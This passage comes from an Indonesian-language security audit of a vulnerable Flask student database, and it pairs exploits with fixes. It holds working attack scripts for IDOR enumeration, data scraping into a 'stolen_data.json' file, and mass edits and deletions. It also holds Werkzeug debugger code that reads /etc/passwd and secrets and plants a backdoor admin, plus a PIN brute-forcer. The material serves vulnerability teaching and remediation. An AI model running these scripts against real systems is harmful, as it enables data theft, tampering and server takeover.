    <input type="text" name="grade" placeholder="Grade" required>
    <button type="submit" class="btn btn-primary">Add Student</button>
</form>
```

**3. Ubah DELETE dari GET ke POST**

```python
# SEBELUM (Vulnerable):
@app.route('/delete/<string:id>')
def delete_student(id):
    # ...

# SESUDAH (Secure):
@app.route('/delete/<int:id>', methods=['POST'])
@csrf.exempt  # Or include CSRF token
def delete_student(id):
    student = Student.query.get_or_404(id)
    db.session.delete(student)
    db.session.commit()
    return redirect(url_for('index'))
```

```html
<!-- Update template untuk use POST -->
<!-- SEBELUM: -->
<a href="/delete/{{ student.id }}" class="btn btn-danger">Delete</a>

<!-- SESUDAH: -->
<form action="/delete/{{ student.id }}" method="POST" style="display:inline;">
    <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
    <button type="submit" class="btn btn-danger"
            onclick="return confirm('Are you sure?')">Delete</button>
</form>
```

**4. Implementasi SameSite Cookie Attribute**

```python
# Configure session cookies with SameSite
app.config.update(
    SESSION_COOKIE_SECURE=True,      # Only send over HTTPS
    SESSION_COOKIE_HTTPONLY=True,    # Not accessible via JavaScript
    SESSION_COOKIE_SAMESITE='Lax',   # CSRF protection
    PERMANENT_SESSION_LIFETIME=1800  # 30 minutes
)

# For stricter protection:
app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'
# But this may break legitimate cross-site flows
```

**5. Custom CSRF Middleware (Alternative)**

```python
import secrets
from functools import wraps
from flask import session, request, abort

def generate_csrf_token():
    if 'csrf_token' not in session:
        session['csrf_token'] = secrets.token_hex(32)
    return session['csrf_token']

def validate_csrf_token():
    token = request.form.get('csrf_token')
    if not token or token != session.get('csrf_token'):
        abort(403, "CSRF token validation failed")

@app.context_processor
def inject_csrf_token():
    return dict(csrf_token=generate_csrf_token)

# Decorator untuk protect endpoints
def csrf_protected(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if request.method == "POST":
            validate_csrf_token()
        return f(*args, **kwargs)
    return decorated_function

# Usage:
@app.route('/add', methods=['POST'])
@csrf_protected
def add_student():
    # ... safe from CSRF
    pass
```

**6. Double Submit Cookie Pattern**

```python
from flask import make_response

@app.route('/form')
def form_page():
    response = make_response(render_template('form.html'))

    # Set CSRF token in cookie
    csrf_token = secrets.token_hex(32)
    response.set_cookie('csrf_token', csrf_token,
                       httponly=False,  # Needs to be readable by JS
                       samesite='Strict')

    # Also pass to template
    return response

# Validation
def validate_csrf_double_submit():
    cookie_token = request.cookies.get('csrf_token')
    form_token = request.form.get('csrf_token')

    if not cookie_token or not form_token or cookie_token != form_token:
        abort(403, "CSRF validation failed")
```

**7. Origin/Referer Header Validation**

```python
@app.before_request
def validate_origin():
    if request.method in ['POST', 'PUT', 'DELETE', 'PATCH']:
        origin = request.headers.get('Origin')
        referer = request.headers.get('Referer')

        allowed_origins = [
            'http://localhost:5000',
            'https://yourdomain.com'
        ]

        # Check if origin/referer is from allowed domains
        if origin:
            if origin not in allowed_origins:
                abort(403, "Invalid origin")
        elif referer:
            from urllib.parse import urlparse
            referer_origin = f"{urlparse(referer).scheme}://{urlparse(referer).netloc}"
            if referer_origin not in allowed_origins:
                abort(403, "Invalid referer")
        else:
            # No origin/referer header - might be suspicious
            abort(403, "Missing origin/referer header")
```

**8. Testing CSRF Protection**

```python
def test_csrf_protection():
    with app.test_client() as client:
        # Test 1: Request without CSRF token should fail
        response = client.post('/add', data={
            'name': 'John',
            'age': 20,
            'grade': 'A'
        })
        assert response.status_code == 403

        # Test 2: Request with invalid token should fail
        response = client.post('/add', data={
            'name': 'John',
            'age': 20,
            'grade': 'A',
            'csrf_token': 'invalid-token'
        })
        assert response.status_code == 403

        # Test 3: Request with valid token should succeed
        with client.session_transaction() as sess:
            sess['csrf_token'] = 'valid-token'

        response = client.post('/add', data={
            'name': 'John',
            'age': 20,
            'grade': 'A',
            'csrf_token': 'valid-token'
        })
        assert response.status_code == 302  # Redirect on success
```

**9. Additional Security Headers**

```python
@app.after_request
def set_csrf_headers(response):
    # Prevent page from being framed (Clickjacking protection)
    response.headers['X-Frame-Options'] = 'DENY'

    # Additional CSRF protection
    response.headers['X-Content-Type-Options'] = 'nosniff'

    return response
```

**Priority: MEDIUM to HIGH - Should be implemented before production**

---

---

### **KERENTANAN 5: Insecure Direct Object Reference (IDOR)**

#### **A. Deskripsi Kerentanan**
Aplikasi menggunakan sequential IDs yang predictable dan tidak memvalidasi apakah user memiliki authorization untuk mengakses, edit, atau delete resource tertentu. Penyerang dapat dengan mudah enumerate dan akses data yang seharusnya tidak mereka akses.

**Lokasi:**
- `/edit/<int:id>` endpoint - app.py:57
- `/delete/<string:id>` endpoint - app.py:49
- URL mengekspos internal database IDs secara langsung

**Karakteristik:**
- Sequential IDs (1, 2, 3, 4, ...)
- No authorization checks
- Predictable resource identifiers

---

#### **B. Cara Eksploitasi**

**Exploit 1: ID Enumeration**

```bash
# Enumerate semua students dengan brute force IDs
for i in {1..1000}; do
    curl -s "http://localhost:5000/edit/$i" | grep "Edit Student"
    if [ $? -eq 0 ]; then
        echo "Found student with ID: $i"
    fi
done
```

```python
import requests

def enumerate_students():
    """Enumerate all student IDs"""
    found_students = []

    for student_id in range(1, 1000):
        response = requests.get(f'http://localhost:5000/edit/{student_id}')

        if response.status_code == 200 and 'Edit Student' in response.text:
            found_students.append(student_id)
            print(f"[+] Found student ID: {student_id}")

        # Extract student data from response
        # Parse HTML to get name, age, grade

    return found_students

# Run enumeration
students = enumerate_students()
print(f"Total students found: {len(students)}")
```

**Exploit 2: Unauthorized Data Access**

```python
def access_all_student_data():
    """Access data for all students without authorization"""
    all_data = []

    for student_id in range(1, 1000):
        try:
            response = requests.get(f'http://localhost:5000/edit/{student_id}')

            if response.status_code == 200:
                # Parse HTML to extract data
                from bs4 import BeautifulSoup
                soup = BeautifulSoup(response.text, 'html.parser')

                name = soup.find('input', {'name': 'name'})['value']
                age = soup.find('input', {'name': 'age'})['value']
                grade = soup.find('input', {'name': 'grade'})['value']

                student_data = {
                    'id': student_id,
                    'name': name,
                    'age': age,
                    'grade': grade
                }
                all_data.append(student_data)

        except Exception as e:
            continue

    # Export all data
    import json
    with open('stolen_data.json', 'w') as f:
        json.dump(all_data, f, indent=2)

    return all_data
```

**Exploit 3: Mass Modification**

```python
def mass_modify_students():
    """Modify all students without authorization"""
    for student_id in range(1, 1000):
        data = {
            'name': 'IDOR Attack Victim',
            'age': 0,
            'grade': 'F'
        }

        response = requests.post(
            f'http://localhost:5000/edit/{student_id}',
            data=data
        )

        if response.status_code in [200, 302]:
            print(f"[+] Modified student ID: {student_id}")

mass_modify_students()
```

**Exploit 4: Mass Deletion**

```python
def mass_delete_students():
    """Delete all students without authorization"""
    for student_id in range(1, 1000):
        response = requests.get(f'http://localhost:5000/delete/{student_id}')

        if response.status_code == 302:  # Redirect indicates success
            print(f"[+] Deleted student ID: {student_id}")

mass_delete_students()
```

**Advanced Exploit: Automated IDOR Scanner**

```python
import concurrent.futures
import requests
from bs4 import BeautifulSoup

class IDORScanner:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()

    def check_id(self, resource_id):
        """Check if ID is accessible"""
        try:
            response = self.session.get(f'{self.base_url}/edit/{resource_id}')

            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')

                # Extract data
                name_input = soup.find('input', {'name': 'name'})
                if name_input:
                    return {
                        'id': resource_id,
                        'status': 'VULNERABLE',
                        'data': {
                            'name': name_input.get('value', ''),
                            'age': soup.find('input', {'name': 'age'}).get('value', ''),
                            'grade': soup.find('input', {'name': 'grade'}).get('value', '')
                        }
                    }
        except Exception as e:
            pass

        return None

    def scan(self, start_id=1, end_id=100, threads=10):
        """Scan range of IDs for IDOR vulnerability"""
        results = []

        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(self.check_id, i): i for i in range(start_id, end_id + 1)}

            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    results.append(result)
                    print(f"[+] IDOR Found: ID {result['id']} - {result['data']['name']}")

        return results

# Usage
scanner = IDORScanner('http://localhost:5000')
vulnerabilities = scanner.scan(start_id=1, end_id=1000, threads=20)

print(f"\n[!] Total IDOR vulnerabilities found: {len(vulnerabilities)}")
print("[!] All student data has been extracted without authorization")
```

---

#### **C. Dampak dari Kerentanan**

**Dampak Teknis:**
1. **Unauthorized Data Access:**
   - Attacker dapat read data semua students
   - Information disclosure vulnerability

2. **Unauthorized Data Modification:**
   - Edit data student lain tanpa permission
   - Data integrity compromised

3. **Unauthorized Data Deletion:**
   - Delete student records tanpa authorization
   - Data loss vulnerability

4. **Privacy Violation:**
   - Personal information (PII) exposed
   - FERPA/GDPR compliance violation

5. **Horizontal Privilege Escalation:**
   - User biasa dapat akses data user lain
   - No access control enforcement

**Dampak Bisnis:**
1. **Compliance Violations:**
   - GDPR (EU): Up to €20 million or 4% of global revenue
   - FERPA (US): Loss of federal funding for educational institutions
   - Data Protection Laws: Various penalties

2. **Privacy Breach:**
   - Student personal information exposed
   - Parent information may be compromised
   - Academic records leaked

3. **Reputational Damage:**
   - Loss of trust from students and parents
   - Negative publicity
   - Institutional credibility damaged

4. **Legal Liability:**
   - Lawsuits from affected individuals
   - Regulatory fines
   - Class action lawsuits possible

5. **Operational Impact:**
   - Need for data breach notifications
   - Incident response costs
   - System audit and remediation

**Real-World Examples:**
- Facebook (2018): IDOR allowed access to private photos
- Instagram (2019): IDOR exposed user email and phone numbers
- Numerous bug bounty reports for IDOR vulnerabilities

**Severity: HIGH** (CVSS Score: 7.5)
- Easy to exploit (sequential IDs)
- Low skill requirement
- Significant impact on confidentiality and integrity
- Affects all resources in the system

---

#### **D. Rekomendasi Perbaikan**

**1. Implementasi Authorization Checks**

```python
from flask_login import current_user, login_required
from functools import wraps

def check_student_access(f):
    """Decorator to check if user can access student resource"""
    @wraps(f)
    def decorated_function(id, *args, **kwargs):
        student = Student.query.get_or_404(id)

        # Check if user owns this resource or is admin
        if current_user.role != 'admin' and student.owner_id != current_user.id:
            abort(403, "Access denied")

        return f(id, *args, **kwargs)
    return decorated_function

@app.route('/edit/<int:id>', methods=['GET', 'POST'])
@login_required
@check_student_access
def edit_student(id):
    student = Student.query.get_or_404(id)
    # ... rest of the code
```

**2. Gunakan UUIDs Instead of Sequential IDs**

```python
import uuid
from sqlalchemy.dialects.postgresql import UUID

class Student(db.Model):
    # Replace sequential ID with UUID
    id = db.Column(UUID(as_uuid=True), primary_key=True, default=uuid.uuid4)
    name = db.Column(db.String(100), nullable=False)
    age = db.Column(db.Integer, nullable=False)
    grade = db.Column(db.String(10), nullable=False)
    owner_id = db.Column(db.Integer, db.ForeignKey('user.id'))  # Link to user

    def __repr__(self):
        return f'<Student {self.name}>'

# Update routes to use UUID
@app.route('/edit/<uuid:id>', methods=['GET', 'POST'])
@login_required
def edit_student(id):
    student = Student.query.get_or_404(id)
    # ... rest of the code
```

**3. Implement Resource-Level Access Control**

```python
class Student(db.Model):
    id = db.Column(UUID(as_uuid=True), primary_key=True, default=uuid.uuid4)
    name = db.Column(db.String(100), nullable=False)
    age = db.Column(db.Integer, nullable=False)
    grade = db.Column(db.String(10), nullable=False)
    owner_id = db.Column(db.Integer, db.ForeignKey('user.id'))
    organization_id = db.Column(db.Integer, db.ForeignKey('organization.id'))

    def can_access(self, user):
        """Check if user can access this student"""
        if user.role == 'admin':
            return True
        if self.owner_id == user.id:
            return True
        if self.organization_id == user.organization_id and user.role == 'teacher':
            return True
        return False

    def can_modify(self, user):
        """Check if user can modify this student"""
        if user.role == 'admin':
            return True
        if self.owner_id == user.id:
            return True
        return False

    def can_delete(self, user):
        """Check if user can delete this student"""
        if user.role == 'admin':
            return True
        if self.owner_id == user.id and user.role == 'teacher':
            return True
        return False

@app.route('/edit/<uuid:id>', methods=['GET', 'POST'])
@login_required
def edit_student(id):
    student = Student.query.get_or_404(id)

    # Check authorization
    if not student.can_modify(current_user):
        abort(403, "You don't have permission to edit this student")

    if request.method == 'POST':
        student.name = request.form['name']
        student.age = request.form['age']
        student.grade = request.form['grade']
        db.session.commit()
        return redirect(url_for('index'))

    return render_template('edit.html', student=student)

@app.route('/delete/<uuid:id>', methods=['POST'])
@login_required
def delete_student(id):
    student = Student.query.get_or_404(id)

    # Check authorization
    if not student.can_delete(current_user):
        abort(403, "You don't have permission to delete this student")

    db.session.delete(student)
    db.session.commit()
    return redirect(url_for('index'))
```

**4. Implement Indirect Object References**

```python
# Create mapping table untuk indirect references
class ResourceToken(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    token = db.Column(db.String(64), unique=True, nullable=False, index=True)
    student_id = db.Column(UUID(as_uuid=True), db.ForeignKey('student.id'))
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'))
    expires_at = db.Column(db.DateTime, nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

    @staticmethod
    def generate_token():
        return secrets.token_urlsafe(32)

# Generate token when showing list
@app.route('/')
@login_required
def index():
    students = Student.query.filter_by(owner_id=current_user.id).all()

    student_list = []
    for student in students:
        # Generate temporary token
        token = ResourceToken.generate_token()
        resource_token = ResourceToken(
            token=token,
            student_id=student.id,
            user_id=current_user.id,
            expires_at=datetime.utcnow() + timedelta(hours=1)
        )
        db.session.add(resource_token)

        student_list.append({
            'token': token,
            'name': student.name,
            'age': student.age,
            'grade': student.grade
        })

    db.session.commit()
    return render_template('index.html', students=student_list)

# Use token instead of direct ID
@app.route('/edit/<token>', methods=['GET', 'POST'])
@login_required
def edit_student(token):
    # Resolve token to student
    resource_token = ResourceToken.query.filter_by(
        token=token,
        user_id=current_user.id
    ).first_or_404()

    # Check if token expired
    if datetime.utcnow() > resource_token.expires_at:
        abort(403, "Token expired")

    student = Student.query.get_or_404(resource_token.student_id)

    # ... rest of the code
```

**5. Filter Queries by User Context**

```python
@app.route('/')
@login_required
def index():
    # ALWAYS filter by current user context
    if current_user.role == 'admin':
        students = Student.query.all()
    elif current_user.role == 'teacher':
        students = Student.query.filter_by(
            organization_id=current_user.organization_id
        ).all()
    else:
        students = Student.query.filter_by(
            owner_id=current_user.id
        ).all()

    return render_template('index.html', students=students)

@app.route('/edit/<uuid:id>', methods=['GET', 'POST'])
@login_required
def edit_student(id):
    # Filter by ownership
    if current_user.role == 'admin':
        student = Student.query.get_or_404(id)
    else:
        student = Student.query.filter_by(
            id=id,
            owner_id=current_user.id
        ).first_or_404()

    # ... rest of the code
```

**6. Logging and Monitoring untuk IDOR Attempts**

```python
import logging

# Setup logging
logging.basicConfig(filename='security.log', level=logging.WARNING)

@app.route('/edit/<uuid:id>', methods=['GET', 'POST'])
@login_required
def edit_student(id):
    student = Student.query.get_or_404(id)

    # Check authorization
    if not student.can_access(current_user):
        # Log IDOR attempt
        logging.warning(
            f"IDOR attempt - User {current_user.id} ({current_user.username}) "
            f"tried to access student {id} (owner: {student.owner_id}) "
            f"from IP: {request.remote_addr}"
        )
        abort(403, "Access denied")

    # ... rest of the code
```

**7. Rate Limiting untuk Prevent Enumeration**

```python
from flask_limiter import Limiter

limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"]
)

@app.route('/edit/<uuid:id>', methods=['GET'])
@login_required
@limiter.limit("10 per minute")  # Prevent rapid enumeration
def edit_student(id):
    # ... rest of the code
    pass
```

**8. Testing for IDOR**

```python
def test_idor_protection():
    # Create two users
    user1 = User(username='user1')
    user2 = User(username='user2')
    db.session.add_all([user1, user2])
    db.session.commit()

    # User1 creates a student
    student = Student(name='Test', age=20, grade='A', owner_id=user1.id)
    db.session.add(student)
    db.session.commit()

    # Test: User2 should NOT be able to access User1's student
    with app.test_client() as client:
        # Login as user2
        client.post('/login', data={'username': 'user2', 'password': 'pass'})

        # Try to access user1's student
        response = client.get(f'/edit/{student.id}')

        # Should get 403 Forbidden
        assert response.status_code == 403
```

**Priority: HIGH - Should be implemented before production**

---

---

### **KERENTANAN 6: Debug Mode Enabled in Production**

#### **A. Deskripsi Kerentanan**
Aplikasi menjalankan Flask dalam debug mode (`debug=True`) yang expose Werkzeug debugger. Debug mode menyediakan console interaktif yang memungkinkan arbitrary code execution.

**Lokasi:**
- `app.py:80` - `app.run(host='0.0.0.0', port=5000, debug=True)`

**Fitur Debug Mode yang Berbahaya:**
1. Interactive debugger dengan Python console
2. Automatic code reloading
3. Detailed error pages dengan source code
4. Stack traces lengkap
5. Environment variables exposure

---

#### **B. Cara Eksploitasi**

**Exploit 1: Trigger Error untuk Access Debugger**

```python
import requests

# Trigger error dengan invalid input
response = requests.post('http://localhost:5000/add', data={
    'name': 'Test',
    'age': 'invalid',  # This will cause error
    'grade': 'A'
})

# Server akan return interactive debugger page
# Buka URL di browser untuk akses Python console
```

**Exploit 2: Code Execution via Debugger Console**

```python
# When debugger appears in browser, attacker can execute:

# Read files
with open('/etc/passwd', 'r') as f:
    print(f.read())

# List directory contents
import os
print(os.listdir('/'))

# Execute system commands
import subprocess
subprocess.check_output(['whoami'])

# Read environment variables (secrets, API keys)
import os
print(os.environ)

# Read application source code
with open('app.py', 'r') as f:
    print(f.read())

# Access database
from app import db
from sqlalchemy import text
result = db.session.execute(text('SELECT * FROM student')).fetchall()
print(result)

# Create backdoor user
from app import User
backdoor = User(username='hacker', role='admin')
backdoor.set_password('password123')
db.session.add(backdoor)
db.session.commit()
```

**Exploit 3: PIN Bypass (Werkzeug Debugger)**

```python
# Werkzeug debugger has a PIN protection
# But PIN can be bruted or calculated if attacker knows:
# - Machine ID
# - MAC address
# - Werkzeug version

import hashlib
import itertools

def generate_pin_candidates(machine_id, mac_address):
    """Generate possible PINs"""
    # Werkzeug PIN generation algorithm
    # Can be reversed if we know system info

    for candidate in range(100000000):
        pin = str(candidate).zfill(9)
        # Test PIN
        yield pin

# Brute force PIN
def brute_force_pin(target_url):
    session = requests.Session()

    # Trigger error to get debugger
    session.get(target_url + '/trigger-error')

    # Extract __debugger__ token from response
    # Try PIN candidates
    for pin in range(100000000):
        data = {
            'cmd': '__import__("os").system("whoami")',
            'pin': str(pin).zfill(9)
        }
        response = session.post(target_url + '/console', data=data)

        if 'Access denied' not in response.text:
            print(f"[+] Valid PIN found: {pin}")
            return pin
```

**Exploit 4: Information Disclosure**

```python
# Debug mode exposes sensitive information in error messages

import requests

# Trigger various errors to gather information
response = requests.get('http://localhost:5000/edit/99999')

# Error page will show:
# - Full file paths
# - Source code snippets
# - Environment variables
# - Installed packages
# - Database connection strings
# - Secret keys
# - Stack traces
```

**Automated Exploit Script:**

```python
import requests
from bs4 import BeautifulSoup

class DebugModeExploit:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()

    def check_debug_mode(self):
        """Check if debug mode is enabled"""
        # Trigger error
        response = self.session.get(f'{self.target_url}/nonexistent')

        if 'Werkzeug Debugger' in response.text or 'Debugger PIN' in response.text:
            print("[+] Debug mode is ENABLED!")
            return True
        return False

    def extract_sensitive_info(self):
        """Extract info from error pages"""
        # Trigger error
        response = self.session.post(f'{self.target_url}/add', data={
            'name': 'test',
            'age': 'invalid',
            'grade': 'A'
        })

        soup = BeautifulSoup(response.text, 'html.parser')

        # Extract file paths
        traceback = soup.find('div', class_='traceback')
        if traceback:
            print("\n[+] File paths found:")
            for line in traceback.find_all('div', class_='line'):
                print(f"    {line.text}")

        # Extract source code
        source = soup.find('div', class_='source')
        if source:
            print("\n[+] Source code exposed:")
            print(source.text)

    def attempt_code_execution(self, command):
        """Attempt code execution via debugger"""
        # This requires PIN, but can try common PINs
        common_pins = ['000000000', '123456789', '111111111']

        for pin in common_pins:
            data = {
                '__debugger__': 'yes',
                'cmd': command,
                'pin': pin
            }
            response = self.session.post(
                f'{self.target_url}/console',
                data=data
            )

            if response.status_code == 200:
                print(f"[+] Command executed with PIN: {pin}")
                print(f"[+] Output: {response.text}")
                return True

        return False

# Usage
exploit = DebugModeExploit('http://localhost:5000')

if exploit.check_debug_mode():
    exploit.extract_sensitive_info()
    exploit.attempt_code_execution('import os; os.system("id")')
```

---

#### **C. Dampak dari Kerentanan**

**Dampak Teknis:**
1. **Remote Code Execution (RCE):**
   - Attacker dapat execute arbitrary Python code
   - Full server compromise possible
   - Can install backdoors, malware

2. **Information Disclosure:**
   - Source code exposed
   - Configuration files revealed
   - Secret keys and API tokens leaked
   - Database credentials exposed
   - Internal paths and structure revealed

3. **Complete System Compromise:**
   - Read any file on server
   - Modify application data
   - Create admin accounts
   - Install persistent backdoors

4. **Data Breach:**
   - Access to entire database
   - Exfiltration of all student records
   - Access to other sensitive files

5. **Denial of Service:**
   - Can crash application
   - Resource exhaustion
   - Database corruption

**Dampak Bisnis:**
1. **Total System Compromise:**
   - Attacker has full control
   - All data at risk

2. **Massive Data Breach:**
   - All student records stolen
   - Confidential information exposed

3. **Service Disruption:**
   - Application can be taken offline
   - Data can be corrupted or deleted

4. **Reputational Catastrophe:**
   - Major security failure
   - Loss of all trust
   - Negative media coverage

5. **Legal and Financial:**
   - Severe regulatory penalties
   - Major lawsuits
   - Recovery costs extremely high

6. **Long-term Damage:**
   - Backdoors may persist
   - Ongoing monitoring required
   - Potential for re-compromise

**Attack Scenarios:**
1. **Initial Access → Full Takeover:**
   - Find error page → Access debugger → RCE → Install backdoor

2. **Credential Theft:**
   - Extract database credentials from debug info
   - Direct database access

3. **Lateral Movement:**
   - Use compromised server as pivot point
   - Attack internal network

**Severity: CRITICAL** (CVSS Score: 10.0)
- Remote Code Execution possible
- No authentication required
- Complete system compromise
- Easy to exploit
- Maximum impact

---

#### **D. Rekomendasi Perbaikan**

**1. Disable Debug Mode in Production (IMMEDIATE)**

```python
# app.py
import os

# SEBELUM (Vulnerable):
if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    app.run(host='0.0.0.0', port=5000, debug=True)  # DANGEROUS!

# SESUDAH (Secure):
if __name__ == '__main__':
    with app.app_context():
        db.create_all()

    # Read from environment variable
    debug_mode = os.environ.get('FLASK_DEBUG', 'False').lower() == 'true'

    # Only allow debug in development
    if os.environ.get('FLASK_ENV') == 'production':
        debug_mode = False

    app.run(
        host='127.0.0.1',  # Don't bind to all interfaces
        port=5000,
        debug=debug_mode  # Controlled by environment
    )
```

**2. Use Environment-Based Configuration**

```python
# config.py
import os

class Config:
    """Base configuration"""
    SECRET_KEY = os.environ.get('SECRET_KEY') or secrets.token_hex(32)
    SQLALCHEMY_DATABASE_URI = os.environ.get('DATABASE_URL') or 'sqlite:///students.db'
    SQLALCHEMY_TRACK_MODIFICATIONS = False

class DevelopmentConfig(Config):
    """Development configuration"""
    DEBUG = True
    TESTING = False

class ProductionConfig(Config):
    """Production configuration"""
    DEBUG = False
    TESTING = False

    # Enforce security settings
    SESSION_COOKIE_SECURE = True
    SESSION_COOKIE_HTTPONLY = True
    SESSION_COOKIE_SAMESITE = 'Lax'

    # Require environment variables in production
    def __init__(self):
        if not os.environ.get('SECRET_KEY'):
            raise ValueError("SECRET_KEY must be set in production")
        if not os.environ.get('DATABASE_URL'):
            raise ValueError("DATABASE_URL must be set in production")

class TestingConfig(Config):
    """Testing configuration"""
    DEBUG = False
    TESTING = True
    SQLALCHEMY_DATABASE_URI = 'sqlite:///:memory:'

# Config dictionary
config = {
    'development': DevelopmentConfig,
    'production': ProductionConfig,
    'testing': TestingConfig,
    'default': DevelopmentConfig
}

# app.py
from config import config

# Load config based on environment
env = os.environ.get('FLASK_ENV', 'development')
app.config.from_object(config[env])
```

**3. Custom Error Handlers**

```python
# error_handlers.py
from flask import render_template, jsonify
import logging

logger = logging.getLogger(__name__)

def init_error_handlers(app):
    @app.errorhandler(404)
    def not_found(error):
        logger.warning(f"404 error: {request.url}")
        return render_template('errors/404.html'), 404

    @app.errorhandler(403)
    def forbidden(error):
        logger.warning(f"403 error: {request.url} - User: {getattr(current_user, 'id', 'anonymous')}")
        return render_template('errors/403.html'), 403

    @app.errorhandler(500)
    def internal_error(error):
        # Log error dengan detail lengkap (tidak exposed ke user)
        logger.error(f"500 error: {error}", exc_info=True)

        # Rollback database jika ada error
        db.session.rollback()

        # Return generic error page (no details)
        return render_template('errors/500.html'), 500

    @app.errorhandler(Exception)
    def handle_exception(error):
        # Log unexpected errors
        logger.error(f"Unexpected error: {error}", exc_info=True)

        # Don't expose error details to user
        return render_template('errors/500.html'), 500

# app.py
from error_handlers import init_error_handlers
init_error_handlers(app)
```

**4. Proper Logging Configuration**

```python
# logging_config.py
import logging
from logging.handlers import RotatingFileHandler, SMTPHandler
import os

def init_logging(app):
    """Configure application logging"""

    if not app.debug:
        # File logging
        if not os.path.exists('logs'):
            os.mkdir('logs')

        file_handler = RotatingFileHandler(
            'logs/app.log',
            maxBytes=10240000,  # 10MB
            backupCount=10
        )
        file_handler.setFormatter(logging.Formatter(
            '%(asctime)s %(levelname)s: %(message)s '
            '[in %(pathname)s:%(lineno)d]'
        ))
        file_handler.setLevel(logging.INFO)
        app.logger.addHandler(file_handler)

        # Email logging for critical errors (optional)
        if app.config.get('MAIL_SERVER'):
            auth = None
            if app.config.get('MAIL_USERNAME'):
                auth = (app.config['MAIL_USERNAME'], app.config['MAIL_PASSWORD'])

            mail_handler = SMTPHandler(
                mailhost=(app.config['MAIL_SERVER'], app.config['MAIL_PORT']),
                fromaddr=app.config['MAIL_DEFAULT_SENDER'],
                toaddrs=app.config['ADMINS'],
                subject='Application Error',
                credentials=auth,
                secure=()
            )
            mail_handler.setLevel(logging.ERROR)
            app.logger.addHandler(mail_handler)

        app.logger.setLevel(logging.INFO)
        app.logger.info('Application startup')

# app.py
from logging_config import init_logging
init_logging(app)
```

**5. Use Production WSGI Server**

```bash
# Don't use Flask development server in production
# Use Gunicorn, uWSGI, or similar

# Install Gunicorn
pip install gunicorn

# Run with Gunicorn (production)
gunicorn -w 4 -b 127.0.0.1:5000 app:app

# Or uWSGI
pip install uwsgi
uwsgi --http 127.0.0.1:5000 --wsgi-file app.py --callable app --processes 4
```

```python
# wsgi.py - Production entry point
import os
from app import app

if __name__ == "__main__":
    # This should NEVER be used in production
    raise RuntimeError("Use a production WSGI server (gunicorn, uwsgi, etc.)")
```

**6. Docker Configuration dengan Proper Settings**

```dockerfile
# Dockerfile
FROM python:3.9-slim

WORKDIR /app

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY . .

# Create non-root user
RUN useradd -m -u 1000 appuser && chown -R appuser:appuser /app
USER appuser

# Environment variables
ENV FLASK_ENV=production
ENV FLASK_DEBUG=0

# Run with Gunicorn
CMD ["gunicorn", "-w", "4", "-b", "0.0.0.0:5000", "app:app"]
```

**7. Environment Variables Management**

```bash
# .env.example (committed to repo)
FLASK_ENV=production
FLASK_DEBUG=0
SECRET_KEY=change-me-in-production
DATABASE_URL=postgresql://user:pass@localhost/dbname

# .env (NOT committed, contains real secrets)
FLASK_ENV=production
FLASK_DEBUG=0
SECRET_KEY=actual-secret-key-here
DATABASE_URL=postgresql://realuser:realpass@localhost/production_db
```

```python
# Load environment variables
from dotenv import load_dotenv
load_dotenv()

# Validate required variables in production
if os.environ.get('FLASK_ENV') == 'production':
    required_vars = ['SECRET_KEY', 'DATABASE_URL']
    missing_vars = [var for var in required_vars if not os.environ.get(var)]

    if missing_vars:
        raise EnvironmentError(
            f"Missing required environment variables: {', '.join(missing_vars)}"
        )
```

**8. Security Testing**

```python
def test_debug_mode_disabled():
    """Test that debug mode is disabled in production config"""
    from config import ProductionConfig

    prod_config = ProductionConfig()
    assert prod_config.DEBUG is False
    assert prod_config.TESTING is False

def test_no_error_details_exposed():
    """Test that error pages don't expose sensitive information"""
    with app.test_client() as client:
        response = client.get('/nonexistent-page')

        # Should not contain:
        assert b'Traceback' not in response.data
        assert b'File "' not in response.data
        assert b'line ' not in response.data
        assert b'Werkzeug' not in response.data

def test_werkzeug_debugger_not_accessible():
    """Test that Werkzeug debugger endpoints are not accessible"""
    with app.test_client() as client:
        response = client.get('/console')
        assert response.status_code in [404, 403]
```

**Priority: CRITICAL - Must be fixed immediately before any deployment**

---

---

### **KERENTANAN 7: Missing Input Validation**

#### **A. Deskripsi Kerentanan**
Aplikasi tidak melakukan validasi proper terhadap user input. Tidak ada pengecekan untuk:
- Tipe data yang sesuai
- Range values (age bisa negatif atau > 200)
- String length limits (name bisa sangat panjang)
- Format validation (grade format tidak dicek)
- Character whitelist/blacklist

**Lokasi:**
- `/add` endpoint - app.py:26-46
- `/edit` endpoint - app.py:57-71
- Semua forms tidak memiliki validation

**Jenis Input yang Tidak Divalidasi:**
1. Name: No length limit, no character restrictions
2. Age: No range check, bisa negatif atau terlalu besar
3. Grade: No format validation

---

#### **B. Cara Eksploitasi**

**Exploit 1: Buffer Overflow / DOS via Long Input**

```python
import requests

# Send extremely long name
long_name = 'A' * 1000000  # 1 million characters

data = {
    'name': long_name,
    'age': 20,
    'grade': 'A'
}

response = requests.post('http://localhost:5000/add', data=data)
# May cause memory issues, slow queries, or database errors
```

**Exploit 2: Invalid Age Values**

```python
# Negative age
data = {'name': 'Test', 'age': -999, 'grade': 'A'}
requests.post('http://localhost:5000/add', data=data)

# Age too large
data = {'name': 'Test', 'age': 999999, 'grade': 'A'}
requests.post('http://localhost:5000/add', data=data)

# Age as string (may cause SQL error with current vulnerable query)
data = {'name': 'Test', 'age': 'abc', 'grade': 'A'}
requests.post('http://localhost:5000/add', data=data)
```

**Exploit 3: Invalid Grade Format**

```python
# Invalid grades that should be rejected
invalid_grades = [
    'Z',           # Not A-F
    'A+++',        # Too many plusses
    '100',         # Numeric instead of letter
    'Pass',        # Word instead of letter
    '',            # Empty
    'A' * 1000,    # Very long
]

for grade in invalid_grades:
    data = {'name': 'Test', 'age': 20, 'grade': grade}
    requests.post('http://localhost:5000/add', data=data)
```

**Exploit 4: Special Characters Injection**

```python
